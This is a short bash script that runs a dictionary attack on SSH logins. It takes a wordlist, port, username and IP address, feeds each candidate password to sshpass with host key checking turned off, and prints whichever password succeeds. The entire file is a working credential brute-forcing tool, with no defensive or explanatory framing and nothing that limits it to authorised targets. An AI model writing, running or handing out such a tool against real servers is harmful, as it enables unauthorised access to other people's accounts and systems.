#!/bin/bash

# It will read each line of the input
if [ "$#" -ne 4 ]; then
    echo "Usage: $0 <wordlist> <port> <username> <ip>"
    exit 1
fi

#wordlist file passed as argument, the local port and the username
WORDLIST="$1"
PORT="$2"
USERNAME="$3"
IP="$4"

# Command to execute upon successful SSH login, it is neccesary to halt the connection
COMMAND='echo "Login successful"; exit'

#The dictionary file provided is indeed a valid file
if [ ! -f "$WORDLIST" ]; then
    echo "The file $WORDLIST does not exist."
    exit 1
fi

#This is the main loop, it will try until sshpass has a successful login, there is not possible way to do it manually because ssh needs a interactive shell
while IFS= read -r password; do
    echo "Trying password: $password"
    if sshpass -p "$password" ssh -o StrictHostKeyChecking=no -p "$PORT" "$USERNAME"@"$IP" "$COMMAND"; then
        echo "Password found: $password"
        exit 0
    fi


done < "$WORDLIST"

echo "Password not found"

